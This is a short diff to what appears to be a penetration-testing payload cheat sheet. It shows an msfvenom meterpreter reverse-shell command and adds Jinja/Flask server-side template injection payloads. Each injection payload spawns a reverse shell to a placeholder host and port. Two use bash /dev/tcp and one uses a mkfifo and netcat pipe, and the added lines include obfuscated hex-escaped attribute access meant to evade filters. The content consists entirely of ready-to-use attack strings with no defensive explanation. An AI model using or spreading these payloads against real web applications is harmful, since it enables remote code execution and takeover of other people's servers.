@@ -523,7 +523,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=9001 -f exe -o shel
 #Jinja/Flask
 
 {{ config['RUNCMD']('bash -i >& /dev/tcp/{IP}/{PORT} 0>&1',shell=True) }}
+
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"')|attr('read')()}}
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f').read()}}{%endif%}{%endfor%}
 
 #References
 
